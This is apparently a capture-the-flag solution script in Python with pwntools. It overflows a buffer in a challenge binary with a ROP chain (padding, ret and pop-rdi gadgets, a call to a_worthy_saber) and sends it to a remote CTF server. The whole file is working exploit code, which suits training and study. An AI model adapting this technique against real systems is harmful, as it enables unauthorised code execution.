from pwn import *

e = ELF("./challenge")
# p = process("./challenge")
p = remote("chals.f.cyberthon24.ctf.sg", 40201)

# 1. address of a_worthy_saber
# 2. address of string "worthy"
# 3. a gadget that allows us to control RDI
a_worthy_saber = e.sym.a_worthy_saber
str_worthy = next(e.search(b"worthy\x00"))
pop_rdi_ret = e.sym.craft_saber + 20
ret = e.sym.craft_saber + 21

payload  = b"RED\x00"                           # put in a valid color string
payload += b"A"*52
payload += p64(ret)                             # pad with ret
payload += p64(pop_rdi_ret) + p64(str_worthy)   # prepare RDI = str_worthy
payload += p64(e.sym.a_worthy_saber)            # call a_worthy_saber

p.sendlineafter(b":", payload)              # color
p.sendlineafter(b":", str(0xc3).encode())   # length : ret
p.sendlineafter(b":", str(0x5f).encode())   # width : pop rdi

p.interactive()
